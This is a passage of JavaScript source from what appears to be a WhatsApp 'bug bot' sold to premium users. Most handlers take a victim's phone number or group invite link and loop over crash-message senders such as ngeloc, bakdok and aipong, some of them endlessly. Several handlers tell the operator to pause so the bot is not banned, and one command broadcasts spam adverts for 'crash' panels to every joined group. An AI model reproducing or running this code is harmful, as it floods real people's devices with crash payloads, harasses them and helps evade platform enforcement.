await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'spider-chace': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`use .${command} 1`)
for (let j = 0; j < q; j++) {
ngeloc(m.chat, force)
}
await reply('✅Succes sent by spider v6')
}
break
case "gc-jid": {
if (!isPremium) return reply('*Premium only*') 
reply('Wait')
let getGroups = await deltaxcrash.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `𖥂 *List Grub Lu*\n\n💺Total Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await deltaxcrash.groupMetadata(x)
teks += `⿻ *INFO GROUP*\n│𖥂 *NAMA :* ${metadata2.subject}\n│𖥂 *ID :* ${metadata2.id}\n│𖥂 *MEMBER :* ${metadata2.participants.length}\n╰────|⿻\n\n`
}
reply(`done`)
}
break
case "xhu":{
//if (!isRegistered) return registerbut(noregis)
if (!isPremium) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
let ntahlahh9 = `./lib/IMLEK.mp3`
let getGroups = await deltaxcrash.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)

let teks22 = `LIST HARGA PANEL 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 CRASH\n\n 8 GB 5K \n UNLI 10K\n\n spesifikasi panel\n ram 16 gb\n room 200 gb \n anti delay`
const buf = await getBuffer(`https://telegra.ph/file/d725cb646cb63f7559486.jpg`)
for (let x of data) {
await deltaxcrash.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
await deltaxcrash.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
await sleep(100)
}
reply(`Success send broadcast message to ${data.length} groups chats`)
}
break
case "addowner":
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
if (!args[0]) return reply(`Use ${prefix+command} number\nContact ${prefix+command} 25473123456789`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await deltaxcrash.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Number Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Number ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
if (!args[0]) return reply(`Use ${prefix+command} number\nContact ${prefix+command} 25473123456789`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Number ${ya} Telah Di Hapus Owner!!!`)
break
case "spider-boom": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "systemuicrash": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "spider1": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "spider2": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

	case "ios24j": case "ios-shut": {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`use .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Use Number without Country Code\n\n<✓> Example : .${command} 254392784527`)
await reply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
		
case 'iphone-ui': case 'fake-ios': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`use .${command} 254392784527|1\n#  300.seconds`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> use number with country code\n\n<✓> Example : .${command} 254392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " seconds");
reply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
reply(`👤 Succes Send Bug Ke ${target} to the target ${ppk} seconds`)
}
break
case "spider-web": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "spidercrash": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "ui-grup": {
  
    if (!isPremium) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await deltaxcrash.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONE BUG HAS BEEN SENT TO THE GROUP!.*");
      deltaxcrash.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case "reset-ui": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "addprem":{
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
if (!args[0]) return reply(`Use ${prefix+command} number\nContact ${prefix+command} 25473123456789`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await deltaxcrash.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Number Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Number ${prrkek} Telah Menjadi Premium!`)
}
break
//=================================================//
case 'satanic999': case '🌹': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'spider-vip': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
//=================================================//
case '🗿': case 'spider-virus': case 'crash-total': case '🔥': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'sam-bug': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
		case "ping": {
  const startTime = new Date();
  const pingMsg = await deltaxcrash.sendMessage(m.chat, { text: '*sᵖᵉᵉᵈ*' });

 await deltaxcrash.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `* sᵖⁱᵈᵉʳ ᴠ6 sᵖᵉᵉᵈ ➟* *${new Date() - startTime}* ᴍs `
        }
      }
    }, {});
  } 
break
	case "runtime":
                let pinga = ` รρเ∂εɾ ѵ6 ɦαร ɓεεɳ αcƭเѵε ƒσɾ ${runtime(process.uptime())}`
               deltaxcrash.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `sᵖⁱᵈᵉʳ ᴠ6`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: 'https://telegra.ph/file/b127513eb930ee73178dd.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.ᯤ\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-dark": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "eror-bug": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anything-crash": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-ui": {

if (!isPremium) return reply('_</> Can only be used by premium users..._')
